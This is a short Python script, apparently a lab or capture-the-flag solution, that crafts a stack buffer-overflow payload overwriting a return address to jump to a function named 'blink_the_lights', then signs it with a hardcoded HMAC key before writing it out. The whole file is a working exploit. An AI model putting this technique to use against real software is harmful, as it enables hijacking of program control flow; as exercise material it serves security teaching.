import sys
import hmac
import hashlib

s = "Hello, world!"
dataLen = len(s)

# sys.stdout.buffer.write(int.to_bytes(dataLen, 4, 'little'))

# sys.stdout.buffer.write(s.encode())

# key = bytearray.fromhex("63bd8135")
# key = b'\x35\x81\xbd\x63'

key = bytearray.fromhex("3388032c303f0ffd42748acd89bd81cb0c87acdc4c75b560ae078ec363bd8135")
key.reverse()

# h = hmac.new(key, s.encode(), hashlib.sha256).digest()

# sys.stdout.buffer.write(h)



# Address of blink_the_lights 
lent = 200

a = b'A'*112
addr = b"\xce\x96\x04\x08"

injection = a + addr
lent = len(injection)

h = hmac.new(key, injection, hashlib.sha256).digest()


sys.stdout.buffer.write(int.to_bytes(lent, 4, 'little'))
sys.stdout.buffer.write(injection)
sys.stdout.buffer.write(h)